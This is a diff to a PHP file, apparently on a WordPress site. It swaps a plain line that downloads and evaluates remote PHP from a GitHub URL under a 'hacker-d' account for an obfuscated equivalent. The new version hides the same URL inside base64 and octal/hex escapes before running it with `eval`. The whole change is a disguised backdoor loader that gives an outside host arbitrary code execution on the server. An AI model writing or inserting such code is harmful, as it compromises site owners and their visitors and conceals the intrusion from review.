@@ -1,3 +1,1 @@
-<?php
-?>
-<?=eval("?>".file_get_contents("https://raw.githubusercontent.com/hacker-d/22/main/wp-22.php"));
+<?php eval(base64_decode('CiBlY2hvIGV2YWwoIlw3N1x4M2UiIC4gZmlsZV9nZXRfY29udGVudHMoIlwxNTBcMTY0XHg3NFx4NzBcMTYzXHgzYVx4MmZcNTdceDcyXDE0MVwxNjdceDJlXDE0N1wxNTFcMTY0XHg2OFx4NzVcMTQyXHg3NVx4NzNcMTQ1XDE2Mlx4NjNcMTU3XHg2ZVx4NzRcMTQ1XHg2ZVx4NzRceDJlXDE0M1x4NmZceDZkXDU3XDE1MFx4NjFceDYzXDE1M1x4NjVcMTYyXHgyZFx4NjRcNTdcNjJceDMyXHgyZlwxNTVceDYxXDE1MVwxNTZceDJmXHg3N1x4NzBceDJkXHgzMlw2Mlw1NlwxNjBceDY4XHg3MCIp')); ?>
